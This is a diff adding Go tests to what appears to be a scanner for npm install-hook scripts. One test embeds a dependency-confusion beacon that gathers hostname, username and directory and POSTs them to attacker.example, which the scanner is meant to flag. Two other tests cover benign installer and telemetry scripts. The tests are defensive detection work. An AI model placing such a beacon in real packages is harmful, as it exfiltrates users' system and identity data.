@@ -248,3 +248,59 @@ func sameStrings(a, b []string) bool {
 	}
 	return true
 }
+
+// TestScanReferencedBody_HostReconBeaconFires is the dependency-confusion
+// beacon, trimmed from a 2025 Datadog sample (the host is redacted): the
+// script a preinstall hook runs collects hostname and user and POSTs them. It
+// evals nothing, so before 2026-10-03 it classified as KindPresent.
+func TestScanReferencedBody_HostReconBeaconFires(t *testing.T) {
+	body := `const os = require("os");
+const https = require("https");
+const trackingData = JSON.stringify({
+    c: __dirname,
+    hn: os.hostname(),
+    un: os.userInfo().username,
+});
+var req = https.request({ hostname: "attacker.example", method: "POST" }, (res) => {});
+req.write(trackingData);
+req.end();`
+	if got := ScanReferencedBody(body); got != KindFetchesRemote {
+		t.Fatalf("recon beacon = %q, want %q", got, KindFetchesRemote)
+	}
+}
+
+// TestScanReferencedBody_InstallerReadingHomeAndProxyStaysClean is the shape
+// of a real binary installer (puppeteer, @sentry/cli, esbuild): it picks a
+// cache directory under the home directory, reads proxy settings, works out
+// the platform and downloads. None of that is recon of the user.
+func TestScanReferencedBody_InstallerReadingHomeAndProxyStaysClean(t *testing.T) {
+	body := `const os = require("os");
+const https = require("https");
+const path = require("path");
+const cache = path.join(os.homedir(), ".cache", "tool");
+const proxy = process.env.HTTPS_PROXY || process.env.npm_config_https_proxy;
+const target = os.platform() + "-" + os.arch();
+https.get("https://releases.example/tool-" + target + ".tar.gz", (res) => {
+    res.pipe(require("fs").createWriteStream(path.join(cache, "tool.tgz")));
+});`
+	if got := ScanReferencedBody(body); got != KindPresent {
+		t.Fatalf("binary installer = %q, want %q", got, KindPresent)
+	}
+}
+
+// TestScanReferencedBody_TelemetryUsernameStaysClean is the @scarf/scarf
+// postinstall shape: it reads the username and reports to its own analytics
+// host, with an opt-out. os.userInfo is deliberately not recon (it warned on
+// scarf 1.4.0 and 0.2.0 and bought 1 of 72 malware samples).
+func TestScanReferencedBody_TelemetryUsernameStaysClean(t *testing.T) {
+	body := `const os = require("os");
+const https = require("https");
+if (process.env.DO_NOT_TRACK === '1') { process.exit(0) }
+const username = os.userInfo().username;
+const req = https.request({ hostname: "telemetry.example", method: "POST" }, () => {});
+req.write(JSON.stringify({ user: hash(username) }));
+req.end();`
+	if got := ScanReferencedBody(body); got != KindPresent {
+		t.Fatalf("telemetry postinstall = %q, want %q", got, KindPresent)
+	}
+}
